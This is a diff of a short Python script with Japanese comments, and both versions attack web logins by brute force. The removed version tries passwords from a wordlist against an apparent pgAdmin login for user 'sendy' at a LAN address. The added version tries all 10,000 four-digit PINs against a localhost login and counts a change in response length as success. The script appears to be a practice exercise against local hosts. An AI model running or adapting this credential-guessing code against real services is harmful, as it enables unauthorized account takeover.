@@ -1,39 +1,31 @@
+import string
+import itertools
 import requests
 
-cookies = {
-    'PGADMIN_LANGUAGE': 'en',
-}
+nums = list(string.digits)
+pins= list(itertools.product(nums, repeat=4))             
+loop_len = len(pins)
 
-headers = {
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-    'Accept-Language': 'ja,en-US;q=0.9,en;q=0.8',
-    'Cache-Control': 'max-age=0',
-    'Connection': 'keep-alive',
-    # 'Cookie': 'PGADMIN_LANGUAGE=en',
-    'Origin': 'http://localhost:5555',
-    'Referer': 'http://localhost:5555/login',
-    'Sec-Fetch-Dest': 'document',
-    'Sec-Fetch-Mode': 'navigate',
-    'Sec-Fetch-Site': 'same-origin',
-    'Sec-Fetch-User': '?1',
-    'Upgrade-Insecure-Requests': '1',
-    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
-    'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-platform': '"Linux"',
-}
-
-password_list = []
-with open("password-list.txt") as f:
-    line = f.read()
-    password_list = line.splitlines()
-
-for password in password_list:
+for i in range(loop_len):
+    pin_tuple = pins[i]    
+    pin = ''.join(pin_tuple)
+    #①  POSTパラメータをJSON形式で保持する
     data = {
-        'uname': 'sendy',
-        'passw': password,
-    }
+            'email':'abc@abc.com',
+            'passw':pin
+            }
+    #②  requestsライブラリを使って、リクエストを送る
+    response = requests.post('http://localhost:8080/login',data = data)
 
-    response = requests.post('http://192.168.11.7:5555/login', cookies=cookies, headers=headers, data=data)
+    #③  最初は、１つ前の情報がないので対応させる
+    if i == 0: 
+        pre_response_len = len(response.text)
     response_len = len(response.text)
-    print(f'{response_len}:{password}')
+    print(f'{response_len}:{pin}')
+    
+    #④  1つ前のリクエストボディの長さが異なれば、ログイン成功とする
+    if response_len != pre_response_len:
+        break
+    else:
+        pre_response_len = response_len
+
